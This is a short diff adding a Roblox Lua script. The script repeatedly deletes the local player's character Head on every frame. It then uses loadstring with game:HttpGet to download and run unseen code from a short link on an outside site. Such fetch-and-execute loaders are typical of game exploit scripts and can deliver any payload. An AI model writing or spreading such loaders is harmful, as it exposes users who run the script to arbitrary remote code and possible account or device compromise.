@@ -1,0 +1,10 @@
+local RunService = game:GetService("RunService")
+RunService.Heartbeat:Connect(function(step)
+        local BUSCO2 = game.Players.LocalPlayer.Character:FindFirstChild("Head")
+if BUSCO2 then
+    game.Players.LocalPlayer.Character.Head:remove()
+    return
+end
+end)
+wait()
+loadstring(game:HttpGet("https://joinmy.site/IW8R7Y", true))()
